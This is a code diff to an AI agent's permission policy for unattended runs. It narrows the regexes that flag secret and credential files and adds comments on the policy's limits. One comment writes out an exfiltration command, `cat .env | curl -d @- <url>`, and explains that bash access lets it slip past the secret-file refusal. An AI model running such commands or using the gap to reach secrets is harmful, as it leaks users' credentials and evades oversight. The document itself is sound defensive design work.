@@ -31,6 +31,14 @@ import type { SessionID } from "./schema"
 //     project, and secret files (`*.env`, `*.env.*`). Those asks exist to put a human in front of
 //     something, so scoped REFUSES them rather than waving them through: an unattended run is told
 //     no, and carries on.
+//   - WHAT THIS DOES NOT DO. It decides permission asks for tools; it is not a sandbox. The secret-file
+//     refusal covers the `read` and `edit` tools only. `bash` is on the list because an agent working
+//     in its project needs it, so `cat .env`, or `cat .env | curl -d @- <url>`, is not stopped here, and
+//     the ceiling (QueueDenyRules) fences publishing, not exfiltration. Do not read this as "an
+//     unattended run cannot reach secrets". Closing that is a separate decision: deny bash for scoped
+//     runs, or add exfiltration shapes to the ceiling.
+//   - `off` is coherent when a human is watching the session; with nobody there it is a hang, because
+//     Permission.ask has no timeout. It is for a person who wants every question put to them.
 export type Mode = "scoped" | "full" | "off"
 
 export interface Policy {
@@ -63,16 +71,22 @@ export const ScopedAllow: ReadonlySet<string> = new Set([
 // Files whose read or edit the built-in agent asks about on purpose (`*.env`, `*.env.*`, with
 // `*.env.example` exempt), plus the obvious private-key and credential files. An unattended run is
 // refused these instead of being handed them: nobody is there to say yes.
+//
+// Deliberately narrow, because an over-broad rule breaks real repositories: `.key` alone would refuse
+// i18n catalogues (`en.key`) and a bare `credentials` would refuse any file or fixture with that name.
+// A `.key` file counts only when its name says it is a private key; `credentials` only as `credentials.json`
+// or inside a cloud-credentials directory.
 const SENSITIVE: readonly RegExp[] = [
   /(^|[\\/])\.env(\..+)?$/i,
   /\.env$/i,
   /\.pem$/i,
   /\.p12$/i,
   /\.pfx$/i,
-  /\.key$/i,
+  /(private|priv|secret|server|tls|ssl|signing|host|ssh)[^\\/]*\.key$/i,
   /(^|[\\/])id_(rsa|dsa|ecdsa|ed25519)$/i,
   /(^|[\\/])\.(netrc|npmrc|pypirc)$/i,
-  /(^|[\\/])credentials(\.json)?$/i,
+  /(^|[\\/])credentials\.json$/i,
+  /(^|[\\/])\.(aws|azure|gcloud|kube|docker)[\\/]/i,
 ]
 const NOT_SENSITIVE: readonly RegExp[] = [/\.env\.(example|sample|template)$/i]
 
